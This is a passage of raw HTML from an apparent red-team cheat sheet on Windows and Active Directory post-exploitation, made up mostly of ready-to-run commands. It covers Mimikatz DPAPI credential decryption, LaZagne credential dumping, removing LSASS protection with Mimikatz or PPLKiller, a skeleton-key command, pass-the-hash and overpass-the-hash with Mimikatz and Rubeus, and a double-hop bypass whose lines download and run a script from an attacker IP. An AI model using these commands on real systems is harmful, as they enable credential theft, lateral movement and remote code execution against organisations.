class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"dpapi::masterkey /in:C:\Users\&lt;user&gt;\AppData\Roaming\Microsoft\Protect\&lt;user_SID&gt;\&lt;key_GUID&gt; /rpc"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-now-it-possible-to-d">Now it possible to decipher the creds with the key:</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 876px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 875.571px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"dpapi::cred /in:C:\Users\&lt;user&gt;\AppData\Local\Microsoft\Credentials\&lt;blob&gt; /masterkey:&lt;key&gt;"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-lazagne">Lazagne</h4>
<p id="bkmrk-to-retrieve-maximum-">To retrieve maximum creds</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 130.048px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">./lazagne.exe all</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 74px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-bypass-runasppl">Bypass RunAsPPL</h4>
<p id="bkmrk-check-if-runasppl-is">Check if RunAsPPL is enabled in the registry.</p>
<p id="bkmrk-look-at-hklm%5Csystem%5C">Look at <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa</code></p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 391px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 120px; min-width: 390.619px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mimikatz # privilege::debug</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mimikatz # !+</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mimikatz # !processprotect /process:lsass.exe /remove</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mimikatz # misc::skeleton</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">mimikatz # !-</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 120px;"></div><div class="CodeMirror-gutters" style="height: 170px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-if-mimikatz-can%27t-be">If Mimikatz can't be used, <a href="https://github.com/RedCursorSecurityConsulting/PPLKiller">PPLKiller</a> is an alternative</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true"><div style="height: 100%; min-height: 1px; width: 0px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 274.81px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">PPLKiller</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">/</span><span class="cm-identifier">installDriver</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">PPLKiller</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">/</span><span class="cm-identifier">disableLSAProtection</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">PPLKiller</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-operator">/</span><span class="cm-identifier">uninstallDriver</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 0px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 117px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-pass-the-hash">Pass The Hash</h3>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 861px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 34px; min-width: 861.095px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:&lt;nthash&gt; /run:powershell.exe"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 34px;"></div><div class="CodeMirror-gutters" style="height: 84px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h3 id="bkmrk-over-pass-the-hash-%2F">Over Pass The Hash / Pass The Key</h3>
<p id="bkmrk-generate-kerberos-tg">Generate Kerberos TGT from hashes (or AES keys)</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 883px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 163px; min-width: 882.81px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style=""><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With Mimikat</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"sekurlsa::pth /user:Administrator /domain:domain.local /rc4:&lt;nthash&gt; /run:powershell.exe"'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"sekurlsa::pth /user:Administrator /domain:domain.local /aes256:&lt;aes_key&gt; /run:powershell.exe"'</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-comment">#With Rubeus</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">asktgt</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">rc4</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">nthash</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span> <span class="cm-operator">/</span><span class="cm-identifier">opsec</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-punctuation">.\</span><span class="cm-identifier">Rubeus</span><span class="cm-punctuation">.</span><span class="cm-identifier">exe</span> <span class="cm-identifier">asktgt</span> <span class="cm-operator">/</span><span class="cm-identifier">domain</span><span class="cm-operator">:</span><span class="cm-identifier">domain</span><span class="cm-punctuation">.</span><span class="cm-identifier">local</span> <span class="cm-operator">/</span><span class="cm-identifier">user</span><span class="cm-operator">:</span><span class="cm-identifier">Administrator</span> <span class="cm-operator">/</span><span class="cm-identifier">aes256</span><span class="cm-operator">:&lt;</span><span class="cm-identifier">aes_key</span><span class="cm-operator">&gt;</span> <span class="cm-operator">/</span><span class="cm-identifier">ptt</span> <span class="cm-operator">/</span><span class="cm-identifier">opsec</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 163px;"></div><div class="CodeMirror-gutters" style="height: 213px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<h4 id="bkmrk-bypass-kerberos-doub">Bypass Kerberos Double Hop</h4>
<p id="bkmrk-by-default%2C-kerberos">By default, Kerberos <strong>doesn't</strong> permise to run a PSSession into a PSSession (or Invoke-Command into a PSSession, or whatever)</p>
<p id="bkmrk-this-can-be-bypassed">This can be bypassed with Mimikatz, by running a reverse shell in a <strong>Over-Pass-the-Hash</strong> from a PSSession</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 912px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 77px; min-width: 911.762px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$Contents</span> <span class="cm-operator">=</span> <span class="cm-string">"powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://&lt;attacker_IP&gt;/Invoke-HelloWorld.ps1'))"</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Out-File</span> <span class="cm-operator">-</span><span class="cm-identifier">Encoding</span> <span class="cm-identifier">Ascii</span> <span class="cm-operator">-</span><span class="cm-identifier">InputObject</span> <span class="cm-variable-2">$Contents</span> <span class="cm-operator">-</span><span class="cm-identifier">FilePath</span> <span class="cm-punctuation">.</span><span class="cm-operator">/</span><span class="cm-identifier">reverse</span><span class="cm-punctuation">.</span><span class="cm-identifier">bat</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-identifier">Invoke-Mimikatz</span> <span class="cm-operator">-</span><span class="cm-identifier">Command</span> <span class="cm-string">'"sekurlsa::pth /user:user1 /domain:domain.local /ntlm:&lt;nthash&gt; /run:.\reverse.bat"'</span></span></pre></div></div></div></div></div></div><div style="position: absolute; height: 40px; width: 1px; border-bottom: 10px solid transparent; top: 77px;"></div><div class="CodeMirror-gutters" style="height: 127px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 29px;"></div></div></div><div class="CodeMirror-copy"><svg viewBox="0 0 24 24" width="16" height="16" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></div></div>
<p id="bkmrk-in-the-new-shell-it-">In the new shell it is <strong>not</strong> possible to run an <strong>Enter-PSSession</strong>, but it is possible to create a <strong>New-PSSession</strong> and run <strong>Invoke-Command</strong> into this new session</p>
<div class="CodeMirror cm-s-moxer" translate="no"><div class="CodeMirror-vscrollbar" tabindex="-1" cm-not-content="true"><div style="min-width: 1px; height: 0px;"></div></div><div class="CodeMirror-hscrollbar" tabindex="-1" cm-not-content="true" style="display: block; right: 0px; left: 29px;"><div style="height: 100%; min-height: 1px; width: 1180px;"></div></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 29px; margin-bottom: -10px; border-right-width: 40px; min-height: 98px; min-width: 1179.57px; padding-right: 0px; padding-bottom: 10px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre class="CodeMirror-line-like"><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-cursors"></div><div class="CodeMirror-code" role="presentation" contenteditable="true" autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable-2">$sess</span> <span class="cm-operator">=</span> <span class="cm-builtin">New-PSSession</span> <span class="cm-operator">&lt;</span><span class="cm-identifier">target</span><span class="cm-operator">&gt;</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptBlock</span><span class="cm-punctuation">{</span><span class="cm-identifier">whoami</span><span class="cm-punctuation">;</span><span class="cm-identifier">hostname</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Session</span> <span class="cm-variable-2">$sess</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" aria-hidden="true" contenteditable="false" style="left: -29px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 21px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-builtin">Invoke-Command</span> <span class="cm-operator">-</span><span class="cm-identifier">ScriptBlock</span><span class="cm-punctuation">{</span><span class="cm-builtin">mkdir</span> <span class="cm-operator">/</span><span class="cm-identifier">tmp</span><span class="cm-punctuation">;</span> <span class="cm-builtin">iwr</span> <span class="cm-identifier">http</span><span class="cm-operator">://&lt;</span><span class="cm-identifier">attacker_IP</span><span class="cm-operator">&gt;/</span><span class="cm-identifier">Invoke-HelloWorld</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span> <span class="cm-operator">-</span><span class="cm-identifier">o</span> <span class="cm-operator">/</span><span class="cm-identifier">tmp</span><span class="cm-operator">/</span><span class="cm-identifier">Invoke-HelloWorld</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span><span class="cm-punctuation">;</span> <span class="cm-punctuation">.</span> <span class="cm-punctuation">\</span><span class="cm-identifier">tmp</span><span class="cm-punctuation">\</span><span class="cm-identifier">Invoke-HelloWorld</span><span class="cm-punctuation">.</span><span class="cm-identifier">ps1</span><span class="cm-punctuation">}</span> <span class="cm-operator">-</span><span class="cm-identifier">Session</span> <span class="cm-variable-2">$sess</span></span></pre></div></div></div></div></div></div><div 